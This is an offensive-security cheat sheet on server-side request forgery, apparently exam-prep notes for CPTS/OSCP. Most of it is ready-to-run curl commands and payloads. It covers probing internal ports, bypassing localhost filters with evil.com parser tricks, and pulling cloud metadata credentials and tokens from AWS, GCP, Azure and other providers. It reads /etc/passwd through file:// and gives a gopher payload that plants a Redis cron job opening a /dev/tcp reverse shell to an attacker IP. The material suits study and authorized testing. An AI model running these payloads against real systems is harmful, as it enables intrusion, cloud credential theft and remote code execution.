# SSRF Complete

> Server-Side Request Forgery complete reference for CPTS/OSCP exams. Server-side URL fetching vulnerability.

---

## 1. Detection - Parameters to Test

### Common SSRF-Prone Parameters

```txt
?url=
?file=
?page=
?load=
?source=
?redirect=
?path=
?site=
?html=
?template=
?doc=
?data=
?webhook=
?endpoint=
?api=
?fetch=
?callback=
?link=
?href=
?src=
?path=
?image=
?img=
?download=
?proxy=
```

### Entry Point Detection

```bash
# External service call test
curl -s "http://target.com/page.php?url=http://YOUR_SERVER/test"

# Test if they fetch images/external resources
curl -s "http://target.com/page.php?url=http://127.0.0.1:8080/admin"
curl -s "http://target.com/page.php?url=http://internal-service.local/admin"

# Test in different HTTP methods
curl -s -X POST "http://target.com/api/proxy" -d '{"url":"http://127.0.0.1:22"}'
curl -s -X POST "http://target.com/api/proxy" -d '{"endpoint":"http://127.0.0.1:3306"}'

# Test hidden parameters
ffuf -u "http://target.com/api/v1/FUZZ?url=http://test" \
  -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fc 400,404
```

### Types of SSRF

```
Regular SSRF:    Response returned directly to attacker
Blind SSRF:      No response visible, need out-of-band detection
Semi-Blind SSRF: Partial info (timing, error messages, response size)
```

---

## 2. Exploitation Techniques

### Internal Port Scanning

```bash
# Scan localhost ports (check response differences)
curl -s "http://target.com/proxy?url=http://127.0.0.1:22"
curl -s "http://target.com/proxy?url=http://127.0.0.1:80"
curl -s "http://target.com/proxy?url=http://127.0.0.1:3306"
curl -s "http://target.com/proxy?url=http://127.0.0.1:6379"
curl -s "http://target.com/proxy?url=http://127.0.0.1:8080"
curl -s "http://target.com/proxy?url=http://127.0.0.1:27017"

# Scan common internal services
for port in 22 80 443 3306 6379 27017 9200 5432 8080 8443 3000 5000 8000 9000; do
    response=$(curl -s -o /dev/null -w "%{http_code}" \
      "http://target.com/proxy?url=http://127.0.0.1:$port")
    if [ "$response" != "000" ] && [ "$response" != "404" ]; then
        echo "Port $port: HTTP $response"
    else
        echo "Port $port: Closed"
    fi
done
```

### Localhost Bypass Techniques

```bash
# Basic localhost
http://127.0.0.1/
http://localhost/
http://0.0.0.0/

# Decimal IP representation
http://2130706433/              # 127.0.0.1 as decimal
http://0x7f000001/              # 127.0.0.1 as hex

# IPv6 loopback
http://[::1]:80/
http://[0000:0000:0000:0000:0000:0000:0000:0001]/

# CIDR bypasses
http://127.0.0.0/
http://0.0.0.0/

# Using shortnames
http://localhost/
http://l/

# DNS rebinding bypass
http://127.0.0.1.nip.io/       # Resolves to 127.0.0.1
http://1.0.0.127.nip.io/       # Resolves to 127.0.0.1

# URL parser bypasses
http://127.0.0.1:80@evil.com/   # @ sign confuses parsers
http://evil.com#@127.0.0.1/     # Fragment treated differently
http://evil.com\@127.0.0.1/     # Backslash confusion
http://127.0.0.1#@evil.com/

# Redirect-based bypass
# Host a redirect from your server to internal
curl -s "http://target.com/proxy?url=http://YOUR_SERVER/redirect?to=http://127.0.0.1:22"

# DNS-based bypasses (register a domain resolving to 127.0.0.1)
# e.g., spoofed.burpcollaborator.net resolving to internal IP
```

### Accessing Internal Services

```bash
# Cloud metadata endpoints (see section 3)
http://169.254.169.254/latest/meta-data/

# Internal admin panels
http://127.0.0.1:8080/admin
http://127.0.0.1:3000/   # Node apps, Grafana
http://127.0.0.1:5000/   # Flask, Superset
http://127.0.0.1:9200/   # Elasticsearch
http://127.0.0.1:9000/   # Portainer, MinIO

# Internal services
http://127.0.0.1:3306/   # MySQL
http://127.0.0.1:6379/   # Redis
http://127.0.0.1:11211/  # Memcached
http://127.0.0.1:27017/  # MongoDB

# Kubernetes internal
http://kubernetes.default.svc/
http://kubernetes.default.svc.cluster.local/
http://10.0.0.1:443/api/  # Kubernetes API server
http://10.0.0.1:443/healthz

# AWS ECS internal
http://169.254.170.2/v2/credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

### File Read via SSRF

```bash
# file:// protocol (if supported)
curl -s "http://target.com/proxy?url=file:///etc/passwd"
curl -s "http://target.com/proxy?url=file:///var/www/html/config.php"

# dict:// protocol (if supported)
curl -s "http://target.com/proxy?url=dict://127.0.0.1:6379/info"   # Redis info
curl -s "http://target.com/proxy?url=dict://127.0.0.1:3306/status" # MySQL status

# gopher:// protocol (most powerful - can craft raw TCP)
curl -s "http://target.com/proxy?url=gopher://127.0.0.1:6379/_*1%0d%0a\$4%0d%0aINFO%0d%0a"
```

### Mitigation Bypass Techniques

```bash
# Allow list bypass using redirect
# If the app validates the initial URL but follows redirects:
# Step 1: Host a page on your server that redirects to 127.0.0.1
curl -s "http://target.com/proxy?url=http://YOUR_SERVER/redirect_to_internal"

# Parse URI confusion - use alternate representations
http://127.0.0.1/ -> try:
http://127.1/
http://0/
http://0x7f.0.0.1/
http://[0:0:0:0:0:0:0:1]/

# Domain that resolves to 127.0.0.1
http://localtest.me/         # Resolves to 127.0.0.1
http://customer1.app.local/  # Wildcard DNS
http://1.0.0.127.nip.io/     # Resolves to 127.0.0.1

# Bypass block lists with encoding
http://127.0.0.1/%256c/etc/passwd    # Double URL encoding
http://127.0.0.1/..;/etc/passwd      # Path confusion
```

---

## 3. Cloud Metadata Endpoints

### AWS Metadata

```bash
# IMDSv1 (no token required)
curl -s "http://target.com/proxy?url=http://169.254.169.254/latest/meta-data/"
curl -s "http://target.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
curl -s "http://target.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME"
curl -s "http://target.com/proxy?url=http://169.254.169.254/latest/meta-data/public-ipv4"
curl -s "http://target.com/proxy?url=http://169.254.169.254/latest/meta-data/local-ipv4"
curl -s "http://target.com/proxy?url=http://169.254.169.254/latest/user-data"
curl -s "http://target.com/proxy?url=http://169.254.169.254/latest/dynamic/instance-identity/document"

# IMDSv2 (requires token)
# Step 1: Get token
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" -s)

# Step 2: Use token
curl -s "http://169.254.169.254/latest/meta-data/" -H "X-aws-ec2-metadata-token: $TOKEN"
```

### AWS ECS Credentials

```bash
# ECS tasks have different metadata endpoints
curl -s "http://target.com/proxy?url=http://169.254.170.2/v2/credentials/"
curl -s "http://target.com/proxy?url=http://169.254.170.2/v2/metadata/"

# ECS metadata
curl -s "http://target.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ecsInstanceRole"
```

### GCP Metadata

```bash
# GCP metadata endpoint (must have Metadata-Flavor: Google header)
curl -s "http://target.com/proxy?url=http://metadata.google.internal/computeMetadata/v1/"

# With header (if SSRF allows custom headers)
curl -s "http://target.com/proxy?url=http://metadata.google.internal/computeMetadata/v1/" \
  -H "Metadata-Flavor: Google"

# GCP endpoints to try (some may work without header)
http://metadata.google.internal/
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1/instance/attributes/

# GCP metadata via DNS
http://metadata.goog/
http://0.0.0.0/computeMetadata/v1/  # (sometimes works)
```

### Azure Metadata

```bash
# Azure Instance Metadata Service (IMDS)
# Header required: Metadata: true
curl -s "http://target.com/proxy?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01"

# Get managed identity token
curl -s "http://target.com/proxy?url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# Get all instance info
curl -s "http://target.com/proxy?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01&format=json"
```

### DigitalOcean Metadata

```bash
curl -s "http://target.com/proxy?url=http://169.254.169.254/metadata/v1.json"
curl -s "http://target.com/proxy?url=http://169.254.169.254/metadata/v1/user-data"
curl -s "http://target.com/proxy?url=http://169.254.169.254/metadata/v1/keys"
```

### Alibaba Cloud Metadata

```bash
curl -s "http://target.com/proxy?url=http://100.100.100.200/latest/meta-data/"
curl -s "http://target.com/proxy?url=http://100.100.100.200/latest/user-data/"
```

---

## 4. Blind SSRF

### Detection with Callback Services

```bash
# Burp Collaborator (Professional only)
# Burp -> Burp Collaborator client -> "Copy to clipboard"
# Use the collaborator URL in payloads

# Interactsh (free alternative)
interactsh-client
# Returns a unique URL like: abc123.oastify.com

# Blind SSRF test payloads
curl -s "http://target.com/proxy?url=http://YOUR_INTERACTSH_URL/test"
curl -s "http://target.com/proxy?url=http://YOUR_INTERACTSH_URL:8080/test"
curl -s "http://target.com/proxy?url=https://YOUR_INTERACTSH_URL/ssrf"
```

### Setting Up Interactsh

```bash
# Method 1: Command line (returns a unique callback URL)
interactsh-client

# Method 2: Via HTTP API
curl -s https://interactsh.com/register

# Method 3: Self-hosted
docker run -p 80:80 -p 443:443 appsecco/interactsh

# Method 4: OAST (Burp extension)
# Extensions -> BApp Store -> Install "Collaborator Everywhere"

# Poll for interactions
# interactsh-client will show incoming requests automatically
```

### Blind SSRF Payloads

```bash
# HTTP callback
url=http://YOUR_SERVER/callback
url=https://YOUR_SERVER/ssrf

# DNS callback (for SSRF that resolves but doesn't send HTTP)
url=http://UNIQUE_SUBDOMAIN.oastify.com/
url=https://UNIQUE_SUBDOMAIN.oastify.com/

# FTP callback
url=ftp://YOUR_SERVER:21

# File protocol with callback
url=file:///etc/passwd  # Check if you get response
url=file://///YOUR_SERVER/share/test  # Windows UNC path callback
```

### Blind SSRF Exploitation (gopher)

```bash
# gopher protocol is the most powerful for blind SSRF
# Can craft arbitrary TCP packets to internal services

# Redis via gopher (SSRF to RCE)
# SSH key injection into Redis
curl -s "http://target.com/proxy?url=gopher://127.0.0.1:6379/_*3%0d%0a\$3%0d%0aset%0d%0a\$1%0d%0a1%0d%0a\$63%0d%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/YOUR_IP/4444 0>&1%0a%0a%0a%0d%0a*4%0d%0a\$6%0d%0aconfig%0d%0a\$3%0d%0aset%0d%0a\$3%0d%0adir%0d%0a\$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a\$6%0d%0aconfig%0d%0a\$3%0d%0aset%0d%0a\$10%0d%0adbfilename%0d%0a\$4%0d%0aroot%0d%0a*1%0d%0a\$4%0d%0asave%0d%0a"

# MySQL via gopher
curl -s "http://target.com/proxy?url=gopher://127.0.0.1:3306/_..."
```

---

## SSRF Exploitation Checklist

```
[ ] Identify URL parameters that fetch external resources
[ ] Test basic http://callback.com detection
[ ] Test localhost bypasses (127.0.0.1, 0.0.0.0, hex, IPv6)
[ ] Test file://, dict://, gopher:// protocols
[ ] Port scan internal hosts (127.0.0.1:1-10000)
[ ] Check for cloud metadata endpoints
[ ] Try URL parser bypasses (@, #, \)
[ ] Test DNS rebinding domains
[ ] Check for HTTP redirect-based bypass
[ ] For blind SSRF: set up Interactsh/Burp Collaborator
[ ] For blind: test DNS callback (not just HTTP)
```

---

## Related Topics

- [[../../3.1 Recon and Discovery/Web Recon Methodology]] - Identify SSRF surfaces
- [[../3.4 LFI RFI/LFI RFI Path Traversal Complete]] - file:// protocol exploitation
- [[../3.6 Command Injection/Command Injection Complete]] - SSRF to RCE chains
